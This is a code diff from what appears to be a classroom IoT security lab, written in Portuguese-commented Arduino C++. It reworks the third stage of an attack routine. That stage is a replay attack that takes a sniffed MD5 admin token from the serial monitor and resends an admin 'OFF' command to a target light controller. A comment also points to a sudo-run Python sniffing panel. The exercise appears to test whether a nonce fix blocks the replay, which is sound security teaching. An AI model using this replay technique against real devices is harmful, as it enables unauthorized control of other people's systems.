@@ -90,15 +90,18 @@ void executarSequenciaDeAtaque() {
 
   // --------------------------------------------------------------------------
   // TENTATIVA 3: BREAK 2 (REPLAY ATTACK - Replicação do Comando do Admin!)
+  // Cole aqui o token capturado no sniffing (tcpdump/Wireshark/painel Python)
+  // ou envie o token pelo Monitor Serial antes de apertar FLASH.
   // --------------------------------------------------------------------------
-  Serial.println("[3/3] Alvo ja recebeu o Fix! Iniciando Sniffing + REPLAY ATTACK...");
-  String ultimoPacote = extrairCampoJson(statusJson, "ultimo_pacote_rede");
-  Serial.println("      Pacote interceptado na rede: " + ultimoPacote);
+  Serial.println("[3/3] Alvo ja recebeu o Fix! Executando REPLAY ATTACK...");
+  String tokenCapturado = "";
+  if (Serial.available()) {
+    tokenCapturado = Serial.readStringUntil('\n');
+    tokenCapturado.trim();
+  }
 
-  int idxToken = ultimoPacote.indexOf("token=");
-  if (idxToken != -1) {
-    String tokenCapturado = ultimoPacote.substring(idxToken + 6);
-    Serial.println("      Token MD5 extraido: " + tokenCapturado);
+  if (tokenCapturado.length() > 0) {
+    Serial.println("      Token MD5 capturado: " + tokenCapturado);
     Serial.println("      Replicando comando OFF com o Token capturado...");
 
     http.begin(client, ALVO_HOST + "/luz?acao=OFF&user=admin&token=" + tokenCapturado);
@@ -113,7 +116,8 @@ void executarSequenciaDeAtaque() {
       Serial.println("[BLOQUEADO] O alvo rejeitou o Replay Attack (Nonce ativo): " + respReplay);
     }
   } else {
-    Serial.println("[AVISO] Nenhum token capturado ainda. Peca para o Admin usar o sistema 1 vez!");
+    Serial.println("[AVISO] Para Replay via 2a placa, envie o token capturado pelo Monitor Serial");
+    Serial.println("        (ou use 'sudo python3 ataques/painel_ataque_grupo.py' para sniffar ao vivo).");
   }
 }
 
